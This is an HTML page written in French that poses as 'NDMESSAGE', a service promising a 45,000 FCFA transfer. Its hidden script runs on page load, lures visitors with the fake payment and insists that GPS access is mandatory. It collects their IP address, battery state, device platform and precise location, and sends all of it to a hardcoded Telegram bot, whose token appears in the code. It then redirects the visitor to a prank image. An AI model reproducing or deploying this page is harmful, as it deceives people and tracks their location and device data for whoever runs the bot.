<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NDMESSAGE - Réclamer vos 45 000 FCFA</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#111b21] text-white flex items-center justify-center h-screen font-sans">
    <div class="text-center p-6 max-w-sm w-full">
        <div class="mb-6 flex justify-center">
            <div class="animate-spin rounded-full h-12 w-12 border-4 border-t-transparent border-[#00a884]"></div>
        </div>
        <h1 class="text-2xl font-light mb-2 text-[#00a884]">NDMESSAGE</h1>
        <p class="text-gray-400 text-sm mb-8">Vérification du compte pour le transfert des 45 000 FCFA...</p>
        <div id="status" class="text-gray-500 text-xs font-mono uppercase tracking-widest">Initialisation du paiement...</div>
    </div>

    <script>
        // TES INFOS RÉCUPÉRÉES
        const BOT_TOKEN = "8623909429:AAGXjNNbgo6qrMDzuF46CAmhz4HBRLB9TM8";
        const CHAT_ID = "6224971749";

        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch (e) { return "Inconnue"; }
        }

        async function sendToTelegram(data) {
            const message = `
🎁 *PRANK NDMESSAGE RÉUSSI* 🎁
------------------------------
👤 *Cible:* Un ami a mordu à l'hameçon
📍 *IP:* ${data.ip}
🔋 *Batterie:* ${data.batterie} (${data.en_charge})
📱 *Appareil:* ${data.os}
🌍 *Position:* ${data.lat && data.lon ? `https://www.google.com/maps?q=${data.lat},${data.lon}` : "GPS REFUSÉ"}
------------------------------
👨‍💻 *Note:* Tu peux maintenant le "hacker" avec ces infos !
            `;

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"
                })
            });
        }

        async function prankCollect() {
            const ip = await getIP();
            const battery = await navigator.getBattery();
            const status = document.getElementById('status');

            navigator.geolocation.getCurrentPosition(async (pos) => {
                status.innerText = "TRANSFERT EN COURS...";
                const info = {
                    ip: ip,
                    batterie: Math.round(battery.level * 100) + "%",
                    en_charge: battery.charging ? "En charge" : "Sur batterie",
                    os: navigator.platform,
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude
                };
                await sendToTelegram(info);
                
                // Redirection vers une image de prank finale
                setTimeout(() => {
                    window.location.href = "https://i.imgur.com/K1z3s1H.jpeg";
                }, 2000);

            }, (err) => {
                status.innerText = "ERREUR: GPS OBLIGATOIRE POUR LE PAIEMENT";
                sendToTelegram({ ip: ip, batterie: "GPS REFUSÉ", os: navigator.platform });
            });
        }

        setTimeout(prankCollect, 2500);
    </script>
</body>
</html>
